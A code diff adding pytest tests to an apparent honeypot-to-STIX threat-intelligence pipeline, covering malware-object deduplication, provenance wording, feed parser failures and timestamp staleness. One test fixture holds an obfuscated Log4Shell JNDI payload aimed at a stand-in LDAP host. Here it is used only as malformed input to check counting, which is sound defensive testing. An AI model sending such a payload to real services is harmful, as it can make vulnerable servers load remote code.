@@ -321,3 +321,86 @@ def test_cidrset_agrees_with_brute_force_including_at_boundaries():
                    if 0 <= v < 2**32]
     for ip in probes:
         assert (ip in cs) is brute(ip), f"disagreement at {ip}"
+
+
+def test_a_second_ip_sharing_a_family_KEEPS_its_edge(builder):
+    """The builder dedups a Malware SDO already emitted this cycle, returning
+    None. Dropping the relationship alongside it would silently orphan every
+    address after the first — the same shape as the first-matching-label bug,
+    and invisible in both the counters and the cycle log."""
+    hit = [("feodo", {"families": {"45.9.1.2": "QakBot", "45.9.3.4": "QakBot"}})]
+    first = bl.build_objects(builder, "45.9.1.2", hit, src.SOURCES_BY_KEY)
+    second = bl.build_objects(builder, "45.9.3.4", hit, src.SOURCES_BY_KEY)
+
+    assert "malware" in [o["type"] for o in first]
+    assert "malware" not in [o["type"] for o in second], "expected SDO dedup"
+    rels = [o for o in second if o["type"] == "relationship"]
+    assert len(rels) == 1, "second address lost its edge to the deduped SDO"
+    assert rels[0]["source_ref"] == attacker_ip_observable_id("45.9.3.4")
+    assert rels[0]["target_ref"] == next(
+        o["id"] for o in first if o["type"] == "malware")
+
+
+def test_a_feodo_malware_sdo_does_not_claim_a_captured_sample(builder):
+    """This is the highest-confidence object the module emits, in a project
+    whose predecessor had a key banned for unqualified claims. It came from a
+    downloaded list, and must not assert first-party capture."""
+    objs = bl.build_objects(builder, "45.9.1.2",
+                            [("feodo", {"families": {"45.9.1.2": "QakBot"}})],
+                            src.SOURCES_BY_KEY)
+    mal = next(o for o in objs if o["type"] == "malware")
+    assert "honeypot-captured" not in mal["description"]
+    assert "Feodo" in mal["description"] and "NOT from a captured sample" in mal["description"]
+
+
+def test_observables_carry_no_description_that_could_clobber_core(builder):
+    """Labels-only, matching noisefloor. The publisher sends update=False, and
+    a later second-list hit would rewrite the text to name only the newer
+    source — losing the first either way."""
+    objs = bl.build_objects(builder, "45.9.1.2", [("firehol", {})], src.SOURCES_BY_KEY)
+    assert "x_opencti_description" not in objs[0]
+
+
+def test_unparseable_src_ip_is_counted_not_silently_dropped(cfg, state_db, tmp_path):
+    """CORE's live window holds 16 rows whose src_ip is an obfuscated Log4Shell
+    JNDI payload, not an address. Without a counter they are indistinguishable
+    from "matched no list"."""
+    from tpot2cti.stix.builder import STIXBuilder
+    lists = _lists(state_db)
+    db = _core(tmp_path, ["${${lower:j}ndi:ldap://x/a}", "45.9.1.2"])
+    s = bl.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(),
+                     lists, src.SOURCES_BY_KEY)
+    assert s["malformed"] == 1 and s["matched"] == 1
+
+
+def test_a_parser_raising_something_unexpected_stays_isolated(monkeypatch, state_db):
+    """fetch_source promises per-source isolation. A parser raising anything
+    other than SourceParseError would escape refresh_lists' handler and take
+    down the other three feeds — one bad field in the smallest source."""
+    boom = src.Source(key="feodo", url="http://x", label="l",
+                      parse=lambda body: (_ for _ in ()).throw(TypeError("renamed field")),
+                      meaning="m", min_entries=0)
+    class _Resp:
+        status = 200
+        def read(self): return b"[]"
+        def __enter__(self): return self
+        def __exit__(self, *a): return False
+    monkeypatch.setattr(bl.urllib.request, "urlopen", lambda *a, **k: _Resp())
+    with pytest.raises(src.SourceParseError, match="TypeError"):
+        bl.fetch_source(boom)
+
+
+def test_feodo_detects_a_renamed_field_instead_of_reporting_zero_c2s(monkeypatch):
+    """min_entries=0 cannot catch this: the feed legitimately can be near-empty,
+    so a renamed key yields zero online C2s and passes as a clean result."""
+    with pytest.raises(src.SourceParseError, match="schema has changed"):
+        src._parse_feodo(json.dumps([{"ipAddress": "45.9.1.2", "state": "online"}]))
+
+
+def test_a_future_timestamp_is_not_infinitely_fresh(state_db):
+    """A negative age would sail past the staleness cliff forever — an unknown
+    silently becoming the most confident possible answer."""
+    from datetime import datetime, timedelta, timezone
+    future = (datetime.now(timezone.utc) + timedelta(hours=48)).isoformat()
+    state_db.set("bl_fetched_at:firehol", future)
+    assert bl.age_hours(state_db, "firehol") is None
